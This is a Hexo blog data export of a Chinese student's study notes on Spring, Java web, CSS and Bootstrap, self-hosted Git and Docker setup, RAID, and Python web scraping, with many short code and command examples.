{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2021-10-09T09:54:08.792Z","updated":"2021-03-05T06:21:12.000Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个正在试图摆脱现状的大二学生"},{"title":"所有标签","date":"2021-10-09T09:54:08.805Z","updated":"2021-03-05T06:22:58.000Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2021-10-09T09:54:08.798Z","updated":"2021-03-05T06:24:26.000Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Spring-AOP","slug":"Spring/Spring-AOP","date":"2021-10-14T06:06:46.000Z","updated":"2021-10-14T08:33:22.193Z","comments":true,"path":"2021/10/14/Spring/Spring-AOP/","link":"","permalink":"http://example.com/2021/10/14/Spring/Spring-AOP/","excerpt":"","text":"实现一个动态代理1234567public interface Database &#123; public void add(); public void delete(); public void update(); public void query();&#125;//DataBase 接口 12345678910111213141516171819202122public class Mong implements Database&#123; @Override public void add() &#123; System.out.println(&quot;Mong语言的增加&quot;); &#125; @Override public void delete() &#123; System.out.println(&quot;Mong语言的删除&quot;); &#125; @Override public void update() &#123; System.out.println(&quot;Mong语言的更新&quot;); &#125; @Override public void query() &#123; System.out.println(&quot;Mong语言的查询&quot;); &#125;&#125;//实现类 123456789101112131415161718192021public class Myinvocationhander implements InvocationHandler &#123; Object object; public void setObject(Object object) &#123; this.object = object; &#125; //返回一个代理对象 public Object ret_myproxy()&#123; return Proxy.newProxyInstance(object.getClass().getClassLoader(),object.getClass().getInterfaces(),this); &#125; //实现该接口唯一的方法，通过反射去调用方法 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; Object result=method.invoke(object,args); return result; &#125;&#125;//代理实例处理类/*主要重点在于Proxy中的发挥代理对象方法newProxyInstance以及 Invocationhander接口，以及获得代理对象转型必须是接口，才能向上转型成功，例如该案例中必须将newProxyInstance获取到的代理类转为DataBase*/ 测试类 AOP Spring API接口实现一个切面编程12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;bean id=&quot;sql&quot; class=&quot;service.Sql&quot;/&gt; &lt;bean id=&quot;mong&quot; class=&quot;service.Mong&quot;/&gt; &lt;bean id=&quot;beforeLog&quot; class=&quot;log.LogOupt&quot;/&gt;&lt;!-- 配置AOP对象--&gt; &lt;aop:config&gt;&lt;!-- 配置切入点 expression表达式 execution--&gt; &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* service.Sql.*(..))&quot;/&gt;&lt;!-- 执行环绕--&gt; &lt;aop:advisor advice-ref=&quot;beforeLog&quot; pointcut-ref=&quot;pointcut&quot;/&gt; &lt;/aop:config&gt; &lt;!-- xml注册文件,其中需要关注的是aop的配置文件，一个切入点，也就是需要切入的类中的方法，而advisor则是一个执行方法范围--&gt;&lt;/beans&gt; 测试类则也是返回一个Database接口的bean 执行结果： 自定义类实现切面编程 使用注解实现切面编程1234567891011121314151617181920212223242526272829303132//实例一个切面类package annotation;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.After;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Before;import java.lang.reflect.Method;@Aspectpublic class LogOut &#123; @Before(&quot;execution(* service.Sql.*(..))&quot;) public void before()&#123; System.out.println(&quot;[log]执行前···&quot;); &#125; @After(&quot;execution(* service.Sql.*(..))&quot;) public void after()&#123; System.out.println(&quot;[log]执行后···&quot;); &#125; //proceedingJoinPoint 是一个连接点 @Around(&quot;execution(* service.Sql.*(..))&quot;) public void around(ProceedingJoinPoint pj) throws Throwable &#123; System.out.println(pj.getTarget().getClass()); System.out.println(&quot;执行前！&quot;); pj.proceed();//执行 System.out.println(&quot;执行后！&quot;); &#125;&#125;//其中注释@Aspect @Before @After 字面意思很容易理解 @Around环绕点则可以获取该方法的内容，并使用proceed()函数执行 xml的配置： 运行结果：","categories":[],"tags":[]},{"title":"重拾Boostrap","slug":"前端/重拾Boostrap","date":"2021-10-12T05:42:17.000Z","updated":"2021-10-12T05:51:56.607Z","comments":true,"path":"2021/10/12/前端/重拾Boostrap/","link":"","permalink":"http://example.com/2021/10/12/%E5%89%8D%E7%AB%AF/%E9%87%8D%E6%8B%BEBoostrap/","excerpt":"","text":"容器1234567891011&lt;h1&gt;容器1&lt;/h1&gt; &lt;div class=&quot;container&quot; style=&quot;background-color: aqua;&quot;&gt; &lt;!-- &lt;div style=&quot;height: 100px; width: 100px; background-color: blue;&quot;&gt;&lt;/div&gt; --&gt; &lt;div style=&quot;width: 100%; height: 100px;&quot;&gt;class=&quot;container&quot; style=&quot;background-color: aqua;&quot;&lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;h1&gt;容器2&lt;/h1&gt; &lt;div class=&quot;container-fluid&quot; style=&quot;background-color: yellow;&quot;&gt; &lt;!-- &lt;div style=&quot;height: 100px; width: 100px; background-color: blue;&quot;&gt;&lt;/div&gt; --&gt; &lt;div style=&quot;width: 100%; height: 100px;&quot;&gt;class=&quot;container-fluid&quot; style=&quot;background-color: aqua;&quot;&lt;/div&gt; &lt;/div&gt; container-fluid是充满","categories":[],"tags":[]},{"title":"Java-Objectmap","slug":"Java/Java-Objectmap","date":"2021-10-11T01:01:13.000Z","updated":"2021-10-11T01:34:09.352Z","comments":true,"path":"2021/10/11/Java/Java-Objectmap/","link":"","permalink":"http://example.com/2021/10/11/Java/Java-Objectmap/","excerpt":"","text":"FasterXML Jackson​ 序列化：将java对象转化为字节序列的过程。 ​ 反序列化：将字节序列转化为java对象的过程。 简单的序列化1234567891011121314151617public class Student &#123; public String username; public String password; public String getID()&#123; return &quot;123&quot;; &#125;&#125;public class main &#123; public static void main(String[] args) throws JsonProcessingException &#123; System.out.println(&quot;序列化对象&quot;); Student student=new Student(); student.username=&quot;helo&quot;; student.password=&quot;world&quot;; ObjectMapper objectMapper=new ObjectMapper(); System.out.println(objectMapper.writeValueAsString(student)); &#125;&#125; 就算是没有声明ID也是可以返回，只要get方法是标准的 简单的反序列化将字符串转为Java对象 123System.out.println(&quot;反序列对象&quot;);Student student1=objectMapper.readValue(&quot;&#123;\\&quot;username\\&quot;:\\&quot;helo\\&quot;,\\&quot;password\\&quot;:\\&quot;world\\&quot;&#125;&quot;,Student.class);System.out.println(objectMapper.writeValueAsString(student1)); 只要属性名是真是存在的，就不会报错，如果是没有赋值的话则会初始化成null *在默认情况下（即不对ObjectMapper做任何额外配置，也不对Java对象加任何Annotation），ObjectMapper依赖于Java对象的默认的无参构造函数进行反序列化，并且严格地通过getter和setter的命名规约进行序列化和反序列化。*","categories":[],"tags":[]},{"title":"JavaWeb_Filter","slug":"JavaWeb/JavaWebFilter","date":"2021-10-09T11:21:50.000Z","updated":"2021-10-09T12:17:32.938Z","comments":true,"path":"2021/10/09/JavaWeb/JavaWebFilter/","link":"","permalink":"http://example.com/2021/10/09/JavaWeb/JavaWebFilter/","excerpt":"","text":"1.Filter为了把一些公用逻辑从各个Servlet中抽离出来，JavaEE的Servlet规范还提供了一种Filter组件，即过滤器，它的作用是，在HTTP请求到达Servlet之前，可以被一个或多个Filter预处理，类似打印日志、登录检查等逻辑，完全可以放到Filter中。 1234567891011121314151617@WebFilter(&quot;/user/*&quot;)public class AuthFilter implements Filter &#123; public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; System.out.println(&quot;AuthFilter: check authentication&quot;); HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse resp = (HttpServletResponse) response; if (req.getSession().getAttribute(&quot;user&quot;) == null) &#123; // 未登录，自动跳转到登录页: System.out.println(&quot;AuthFilter: not signin!&quot;); resp.sendRedirect(&quot;/signin&quot;); &#125; else &#123; // 已登录，继续处理: chain.doFilter(request, response); &#125; &#125;&#125; 上面的注释代表着Fitter只过滤/user请求的，/test这类请求并不会被该方法过滤，并且，其中的if循环可以看到有判断当前用户是否有登陆，如果有登陆则继续处理，如果没有登陆则重定向到/signin","categories":[],"tags":[]},{"title":"","slug":"前端/盒子模型","date":"2021-10-09T09:54:09.606Z","updated":"2021-07-22T00:45:50.000Z","comments":true,"path":"2021/10/09/前端/盒子模型/","link":"","permalink":"http://example.com/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"title: 盒子模型date: 2021-07-19 00:04:18tags: 盒子模型 内容区域 content 内边距区域 padding 边框区域 border 外边距区域 margin 边框区域border border-width border-style(必须设置)：solid实线、dashed虚线、dotted点线 border-color 连写：border: 10px solid red； 单方向设置border-top/bottom/right/left：....; 内边框 padding顺时针赋值 padding: xx xx xx xx ;上右下左 自动内减设置一个属性浏览器会自动计算多出了多少，自动在内容中间去CSS3盒模型 属性名：box-sizing；属性值：border-box 外边距 垂直布局的块级元素，上下的margin会进行合并，最终两者的距离为margin的最大值 1.塌陷现象互相嵌套的块级元素，子元素的margin-top会作用在父元素上，导致父元素一起往下移动 1234567891011.father&#123; width: 200px; height: 200px; background-color: skyblue;&#125;.son&#123; margin-top: 10px; width: 100px; height: 100px; background-color: green;&#125; 此时移动的是father整体元素往下移动，因为父子元素的margin-top元素合并了 解决方式： 给父元素设置border-top或者padding-top（分割父子元素的margin-top） 给父元素设置overflow；hidden 转换为行内块元素，合并现象只出现在块级元素 设置浮动 2.行内元素的margin和padding无效情况给行内元素设置margin和padding时：水平方向的margin和padding布局中有效；垂直方向的margin和padding布局中无效 浮动结构伪类选择器能够使用结构伪类选择器在HTML中定位元素 nth of type(n)是在相同元素中找到第n个元素 伪元素一般页面中的非主题内容可以使用伪元素，伪元素必加的属性是content，而对伪元素如果要设置高宽就要将其改为块级元素 浮动属性：float:left、right 浮动特点： 浮动元素会脱离标准流，在标准流中不占位置 浮动元素比标准流高半个级别，可以覆盖标准流中的元素 浮动找浮动，下一个浮动元素会在上一个浮动元素后面左右浮动 元素都往右浮动，下一个元素会以上一个元素为基准进行浮动 浮动元素会受到上面元素边界的影响，如果上面元素标准流已经占满一行，则此时的浮动元素会在本行中进行浮动 浮动元素的特殊效果：一行可以显示多个；可以设置宽高 浮动的元素不能通过text-align:center或者margin:0 auto，让浮动本身元素水平居中 将行内元素变成能设置宽高 清除浮动如果子元素浮动了，此时子元素不能撑开标准流的块级父元素；子元素浮动后脱标就是不占位置，需要父元素有高度，从而不影响其他网页元素的布局 清除浮动的方法 直接给父元素设置高度 额外标签法：在父元素内容最后添加一个块级元素；给添加的块级元素设置clear：both 单伪元素清除法 双伪元素清除法 给父元素设置overflow:hidden BFC块格式化上下文","categories":[],"tags":[]},{"title":"MVC-开发","slug":"JavaWeb/MVC-开发","date":"2021-10-05T02:00:09.000Z","updated":"2021-10-05T02:15:02.000Z","comments":true,"path":"2021/10/05/JavaWeb/MVC-开发/","link":"","permalink":"http://example.com/2021/10/05/JavaWeb/MVC-%E5%BC%80%E5%8F%91/","excerpt":"","text":"上面模型有一定问题，控制层为UserServlet继承自HttpServlet，若当成简单的逻辑控制程序，则不太方便，所以要设计一个只有单纯但处理请求的控制层，返回返回的对象为Model和View，而不是强迫继承Servlet 其中view为一个路径，比如需要渲染的jsp文件路径，model为处理完返回的对象","categories":[],"tags":[]},{"title":"Spring初识","slug":"Spring/Spring初识","date":"2021-10-01T01:21:38.000Z","updated":"2021-10-12T13:54:19.557Z","comments":true,"path":"2021/10/01/Spring/Spring初识/","link":"","permalink":"http://example.com/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/","excerpt":"","text":"控制翻转IOCspring框架 Spring Bean注册 Spring Bean 实际上是将 BeanDefinition 注册到 IoC 容器中。 （一）XML 配置元信息 Spring 的传统配置方式。在 &lt;bean&gt; 标签中配置元数据内容。 12345&lt;bean id=&quot;teacher_wang&quot; class=&quot;teacher.Teacher&quot; p:name=&quot;wangxiaoming&quot; p:sex=&quot;男&quot; p:salary=&quot;10&quot;&gt;&lt;/bean&gt;&lt;!-- 设置别名--&gt;&lt;alias name=&quot;teacher_wang&quot; alias=&quot;teacher_yuwen&quot;/&gt; 缺点是当 JavaBean 过多时，产生的配置文件足以让你眼花缭乱。 （二）注解配置元信息 使用 @Bean、@Component、@Import 注解注册 Spring Bean。 （三）Java API 配置元信息 命名方式：BeanDefinitionRegistry#registerBeanDefinition(String,BeanDefinition) 非命名方式：BeanDefinitionReaderUtils#registerWithGeneratedName(AbstractBeanDefinition,Be anDefinitionRegistry) 配置类方式：AnnotatedBeanDefinitionReader#register(Class...) Bean范围 prototype每次get都会产生一个新的对象 Bean的自动装配 通过注解实现自动装配123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;context:annotation-config/&gt;&lt;/beans&gt; @Autowired @Component @Scope也相似可以设置模式 使用java配置类controller类 appconfig类 测试类","categories":[],"tags":[]},{"title":"自建gitlab","slug":"环境配置/自建gitlab","date":"2021-07-30T13:09:46.000Z","updated":"2021-07-30T14:19:06.000Z","comments":true,"path":"2021/07/30/环境配置/自建gitlab/","link":"","permalink":"http://example.com/2021/07/30/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E8%87%AA%E5%BB%BAgitlab/","excerpt":"","text":"使用git搭建自己私有个人仓库服务端、客户端：安装openssh以及git 服务端：添加一个新的用户git 服务端：添加git的ssh访问，git的home目录中添加一个.ssh目录，存放要登录的公钥到authorized_keys 客户端：使用ssh-keygen -t rsa生成公私钥并且将公钥添加在服务端的authorized_keys 1234567891011121314151617# 切换用户su git# 进入用户主目录cd /home/git# 创建.ssh配置目录，如果有此文件夹，跳过此步mkdir .ssh# 进入.ssh目录并创建authorized_keys文件，用来存放用户访问的ssh公钥cd /home/git/.sshtouch authorized_keys# 设置该目录及authorized_keys文件的权限，权限值不要修改chmod 700 /home/git/.ssh/chmod 600 /home/git/.ssh/authorized_keys####最后将客户端的公钥固执到authoriauthorized_keys 使用ssh 用户名@ip登录是否成功 12345678// 创建数据目录mkdir -p /data/gitlab/configmkdir -p /data/gitlab/logsmkdir -p /data/gitlab/data","categories":[],"tags":[]},{"title":"Docker中安装Vscode+Git","slug":"前端/Docker中安装Vscode-Git","date":"2021-07-23T13:12:05.000Z","updated":"2021-07-23T14:30:40.000Z","comments":true,"path":"2021/07/23/前端/Docker中安装Vscode-Git/","link":"","permalink":"http://example.com/2021/07/23/%E5%89%8D%E7%AB%AF/Docker%E4%B8%AD%E5%AE%89%E8%A3%85Vscode-Git/","excerpt":"","text":"https://uxcool.top/linux/docker-install-vscode.html 12345678910docker run \\ -d \\ --name=vscode \\ --restart unless-stopped \\ -e PUID=0 \\ -e PGID=0 \\ -e PASSWORD=密码 \\ -p 18443:8443\\ -v /opt/docker_sg/vscode/config:/config \\ linuxserver/code-server e PUID 和 e PGID 这两个参数可以可以在终端中输入 id 命令获得，直接填写对应的就好，意思是你想要以哪个用户运行这个 docker 容器。 e PASSWORD 是打开 code-server 网页的密码，不设置的话打开网页编辑器的时候就不需要密码，这样显然不安全。 p 127.0.0.1:18443:8443 是指将容器内的 8443 端口映射到容器外的本机的 18443 端口，127.0.0.1 是指限制端口本地访问（后面可以使用 nginx 反向代理将端口代理到网站的子目录）。 v opt/docker_sg/vscode/config:/config 是 code-server 的配置文件、插件、代码文件的目录，注意要及时备份，免得容器挂掉文件丢失。 增加端口可以先暂停容器，然后commit一下容器后再重新构造一下容器 https://www.huaweicloud.com/articles/2f77258d9743af7269285e1bf10ef58e.html 假设上面设置的名字叫vscode 1docker commit vscode new-vscode 123456docker run \\ -d \\ --name=new-vscode \\ -p 15000:5000 \\ -v /mnt/md0/samba/vscode:/config \\ new-vscode 增加一个运行端口","categories":[],"tags":[]},{"title":"Ubuntu下的raid0和nextcloud","slug":"Linux/Ubuntu下的raid0和nextcloud","date":"2021-07-23T06:16:37.000Z","updated":"2021-07-23T08:20:14.000Z","comments":true,"path":"2021/07/23/Linux/Ubuntu下的raid0和nextcloud/","link":"","permalink":"http://example.com/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/","excerpt":"","text":"格式化磁盘https://blog.csdn.net/s793223706/article/details/95775841?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162702200316780264090495%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162702200316780264090495&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-95775841.pc_search_result_control_group&amp;utm_term=ubuntu+raid0&amp;spm=1018.2226.3001.4187 查看磁盘状态：lsblk 重新分区命令：fdisk 格式化完成 软raid0操作 123sudo mkfs.ext4 -F /dev/md0sudo mkdir -p /mnt/md0sudo mount /dev/md0 /mnt/md0 NextCloudhttps://www.wo66.cc/archives/docker%E9%83%A8%E7%BD%B2nextcloud%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BA%91%E7%9B%98 123456789101112$ docker run -d -p 8088:80 \\--name nextcloud \\--restart=always \\-v /home/nextcloud/html:/var/www/html \\-v /home/nextcloud/apps:/var/www/html/custom_apps \\-v /home/nextcloud/config:/var/www/html/config \\-v /home/nextcloud/data:/var/www/html/data \\-v /home/nextcloud/theme:/var/www/html/themes \\--link mysql:mysql \\--link redis:redis \\nextcloud#将里面的/home/nextcloud改成备份的文件即可不用配置开启容器 Sambahttps://www.linuxidc.com/Linux/2018-11/155466.htm","categories":[],"tags":[]},{"title":"定位","slug":"前端/定位","date":"2021-07-22T01:34:59.000Z","updated":"2021-07-22T11:59:40.000Z","comments":true,"path":"2021/07/22/前端/定位/","link":"","permalink":"http://example.com/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/","excerpt":"","text":"定位 静态定位静态定位是默认值，就是之前的标准流；position：static 相对定位相对于之前的位置的进行移动 position:relative 绝对定位绝对定位是相对于非静态定位的父元素(默认浏览器可视区域)进行定位移动；绝对定位也会脱离标准流， position:absolute 子绝父相在使用子绝父相的时候，发现父元素已经有绝对定位了，直接使用子元素的绝对定位就可以，因为父元素已经有定位已经满足要求。 固定定位position:fixed 需配合方位属性实现移动；相较于浏览器可视区域进行移动；在页面中不占位置(脱标)； 层级关系1.不同布局方式元素的层级关系标准流&lt;浮动&lt;定位 2.不同定位之间的层级关系相对、绝对、固定默认层级相同；此时HTML中写在下面的元素更高，会覆盖上面的元素 3.更改定位元素的层级 子绝父相案例水平居中1.子绝父相2.设置子元素往右移动父元素的一半，也就是子元素设置偏移量left:50%3.让子元素往左移动自己的一半transform:translateX(-50%) 水平垂直居中","categories":[],"tags":[]},{"title":"前端知识点","slug":"前端/前端知识点","date":"2021-07-18T12:38:56.000Z","updated":"2021-07-19T04:57:42.000Z","comments":true,"path":"2021/07/18/前端/前端知识点/","link":"","permalink":"http://example.com/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/","excerpt":"","text":"HTML块级元素1.属性：display:blockdiv、p 2.显示特点： 独占一行 宽度默认父元素的宽度，高度默认由内容撑开 可以设置宽高 行内元素a、span 1.属性：display:inline2.显示特点： 一行可以显示多个 宽度和高度默认由内容撑开 不可以设置宽高 行内块元素1.属性：inline-block2.显示特点： 一行可以显示多个 可以设置宽高 3.代表标签：input、textarea、button、select 特殊情况：img标签有行内块元素特点，但是浏览器工具中显示的是inline 元素模式转换 属性 效果 使用频率 display:block 转换成块级元素 多 display:inline-block 转换成行内块元素 多 display:inline 转换成行内元素 少 嵌套规范 会稽元素一般作为大容器，可以嵌套文本、块级元素、行内元素、行内块元素等等；但是p标签中不要嵌套div、p、h等块级元素 a标签内可以嵌套任意元素，a标签不能再进行嵌套a标签 123&lt;p&gt; &lt;div&gt;在p标签中嵌套div标签&lt;/div&gt;&lt;/p&gt; 浏览器会将其分开 变成两个p标签 居中元素总结 CSScss三大特性 继承性 层叠性 优先级 继承性1.特性：子元素有默认继承父元素样式的特点（子承父业） 2.常见继承的属性： color font的四个属性 text-indent/text-align line-height 2.继承失效特殊情况如果元素有浏览器默认样式，此时继承性依然，但是优先显示浏览器的默认样式 a标签的color会继承失效 h系列标签的font-size会继承失效，因为浏览器默认有设置h的font-size div的高度不能继承，但是宽度有类似于继续效果 层叠性1.特性 优先级选择器只有在选择器相同是才能记性覆盖，如果选择器不同，那么则会优先使用优先选择的选择器","categories":[],"tags":[]},{"title":"前端知识点","slug":"前端/装饰","date":"2021-07-18T12:38:56.000Z","updated":"2021-07-22T13:54:00.000Z","comments":true,"path":"2021/07/18/前端/装饰/","link":"","permalink":"http://example.com/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/","excerpt":"","text":"垂直对齐方式（行内块元素的对齐方式） 1.文本框和按钮无法对齐的现象行内块元素可以直接使用垂直对齐方式 2.input和img直接使用底部对齐即可3.div中的文本框进行贴顶vertical-align：top; 4.div不设高度由img标签撑开，此时img标签下面会存在额外的间隙问题 解决方法两种： 5.使用line-height设置成垂直居中 光标类型 边框圆角 1.画一个正圆 2.胶囊按钮 overflow溢出部分显示效果 元素本身隐藏","categories":[],"tags":[]},{"title":"爬虫注意","slug":"爬虫注意","date":"2021-07-10T13:38:57.000Z","updated":"2021-07-13T17:10:30.000Z","comments":true,"path":"2021/07/10/爬虫注意/","link":"","permalink":"http://example.com/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/","excerpt":"","text":"正则表达式匹配 ​ ！表示不要后面的结果 ​ 匹配结果输入group( )和group(1)会有所不同，前者会输出所有完整的匹配结果，后者会输出第一个被( )匹配的结果 正则表达式mathch()从头开始匹配，一旦头部不匹配，整个匹配失败 search()匹配时扫描整个字符串，返回第一个匹配结果 findall()搜索整个字符串，返回匹配正则表达式的所有内容 sub()通过正则表达式将文本里的内容全部去掉，第一个参数为正则表达式，第二个参数为替换成为的内容，第三个为原字符串 123url=&quot;hsdkjahkj123131jjhashdkj&quot;res=re.sub(&quot;\\d&quot;,&quot;&quot;,url)print(res) 运行结果： 正则表达式练习题 \\1表示 .*==(…) XPATHXPATH常用规则 属性匹配用@符号进行过滤 1//li[@class=&quot;hello&quot;] 其中过滤出所有class是hello的节点 如果要匹配是否有存在应该使用cantain函数，同时该函数可以用来匹配多个属性 12//li[contains(@class,&quot;li&quot;)]/a/text()//li[contains(@class,&quot;li&quot;) and @name=&quot;item&quot;]/a/text() 文本获取使用text( )方法 1html.xpath(&#x27;//li[@class=&quot;item-0&quot;]/a/text()&#x27;) 其中获取的的是li标签下所有a的值 属性获取通过@来获取节点的属性，与属性匹配不同，属性匹配使用中括号加属性名和值来限定某个属性，如[@href=&quot;link1.html&quot;]，而此处的@herf指的是获取节点的某个属性 1html.xpath(&#x27;//li/a/@href&#x27;) 选择：按序选择和节点轴选择 Beautilful Soup基本用法123456#初始化一个beautifsoup对象#初始化beautifulsoupsoup = BeautifulSoup(res.text,&#x27;lxml&#x27;)#print(soup.prettify())#打印titleprint(soup.title.string) 节点选择器12bs4.element.Tag其中bs4位一个beautifulsoup对象，element为一个标签，Tag为其中的属性如string/name 1.提取信息名称：name获取当前dom的名称比如a、div、title 属性：attrs的返回结果是字典形式 内容：利用string属性获取节点内包含的文本内容 2.嵌套选择12soup.head.titlesoup.head.title.string 3.关联选择1234567#子和子孙节点#直接子节点 调用contents属性 得到是世界子节点的列表，得不到孙子节点soup.element.contents#调用children属性得到相应的结果soup.element.children#获得所有子孙节点的，要调用descendants，descendants其中会进行的贵查询所有子节点，得到所有子孙节点soup.element.descendants 12345#父亲和祖先节点#获取某个节点元素的父节点 调用parentsoup.element.parent#获取所有的父亲节点 调用parentssoup.element.parents 123#兄弟节点soup.element.next_siblings #下一个soup.element.previous_siblings #上一个 方法选择器1.find_all( )1soup.find_all(name,attrs,recursive,text,**kwargs) 其中可以使用的name以及attrs联合查询，比如 1li_list=soup.find_all(name=&quot;li&quot;,attrs=&quot;rank-item&quot;) 其中找的是所有的为li的元素以及类中有属性rank-item 使用text参数就是匹配节点的文本，传入的形式可以是字符串或者正则表达式 2.find( )与上面差不多，find( )返回的是第一个元素 CSS选择器 使用pyquery 代理多线程线程池一次性开辟一些线程，我们用户直接给线程池提交任务，线程任务的调度交给线程池来完成 协程 12345678910111213141516171819202122232425262728293031323334#coding=utf-8##异步的操作都需要用await 也就是阻塞声明#拿到章节的url=http://dushu.baidu.com/api/pc/getCatalog?data=&#123;%22book_id%22:%224306063500%22&#125;###协程爬取的注意事项#1.必须创建一个任务集合 里面保存的是异步任务函数的调用 tasks[&#x27;xxx()&#x27;,xxx()]#2.异步函数 必须用async声明 并且使用的使用需要用await进行阻塞import asyncioimport reimport requestsimport aiohttpimport aiofilesasync def download_chapter(cid,cname): chapter_url=&quot;http://dushu.baidu.com/api/pc/getChapterContent?data=&#123;%22book_id%22:%224306063500%22,%22cid%22:%224306063500|&quot;+cid+&quot;%22,%22need_bookinfo%22:1&#125;&quot; chapter_url=re.sub(&quot;%22&quot;,&quot;\\&quot;&quot;,chapter_url) async with aiohttp.ClientSession() as session: async with session.get(url=chapter_url) as result: dic= await result.json() #print(dic) async with aiofiles.open(f&quot;./novel/&#123;cname&#125;.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;) as f: await f.write(dic[&quot;data&quot;][&quot;novel&quot;][&quot;content&quot;])async def test(): form_url = &quot;http://dushu.baidu.com/api/pc/getCatalog?data=&#123;%22book_id%22:%224306063500%22&#125;&quot; form_url = re.sub(&quot;%22&quot;, &quot;\\&quot;&quot;, form_url) result = requests.get(form_url) tasks=[]#这个为异步任务 for it in result.json()[&quot;data&quot;][&quot;novel&quot;][&quot;items&quot;]: tasks.append(download_chapter(it[&quot;cid&quot;],it[&quot;title&quot;])) await asyncio.wait(tasks)if __name__ == &#x27;__main__&#x27;: asyncio.run(test()) 通过使用协程去爬取小说网站 其中需要注意的是包aiohttp/aiofiles 结果： 视频抓取1.M3U8文件中的记录了所有的文件顺序2.通过M3U8下载ts文件3.合并成mp4文件SELENIUMRequest模块使用url参数使用的是dict 12345678910dict=&#123;&#125;dict[&quot;name&quot;]=&quot;xiaoming&quot;dict[&quot;msg&quot;]=&quot;hello&quot;res=requests.get(&quot;http://httpbin.org/get&quot;,params=dict)print(res.url)dict[&quot;msg&quot;]=[&quot;hello1&quot;,&quot;hello2&quot;]res=requests.get(&quot;http://httpbin.org/get&quot;,params=dict)print(res.url) response的返回内容123456789res=requests.get(&quot;http://httpbin.org/get&quot;,params=&#123;&quot;name&quot;:&quot;xiaoming&quot;&#125;)print(type(res.text))print(type(res.content))print(res.content)print(type(res.json()))print(res.raw)#要读出raw中，必须设置stream中为Trueres=requests.get(&quot;http://httpbin.org/get&quot;,params=&#123;&quot;name&quot;:&quot;xiaoming&quot;&#125;,stream=True)print(res.raw.read(10)) response的状态码123456789101112131415from requests import HTTPErrorres=requests.get(&quot;http://httpbin.org/get&quot;,params=&#123;&quot;name&quot;:&quot;xiaoming&quot;&#125;)print(res.status_code)res.raise_for_status()#里面有存在一些校验码 200if res.status_code==requests.codes.all_good: print(&quot;OK&quot;)#使用其中的异常try: r_404= requests.get(&quot;http://httpbin.org/404&quot;) #通过 Response.raise_for_status() 来抛出异常 r_404.raise_for_status()except HTTPError as r: print(r) print(&quot;Error&quot;)","categories":[],"tags":[]},{"title":"Git使用","slug":"环境配置/Git使用","date":"2021-07-10T05:15:18.000Z","updated":"2021-07-10T06:06:56.000Z","comments":true,"path":"2021/07/10/环境配置/Git使用/","link":"","permalink":"http://example.com/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"数据库系统概论","slug":"数据库/数据库系统概论","date":"2021-06-30T12:23:21.000Z","updated":"2021-06-30T14:33:04.000Z","comments":true,"path":"2021/06/30/数据库/数据库系统概论/","link":"","permalink":"http://example.com/2021/06/30/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/","excerpt":"","text":"数据库设计三大范式第一范式要求有主键，并且要求每一个字段的原子性不可再分 最后一条记录和第一条重复，不唯一，没有主键，联系方式可以再分，不满足第一范式 第二范式要求所有非主键字段完全依赖主键，不能产生部分依赖 第三范式所有非主键字段和主键字段之间不能产生传递依赖 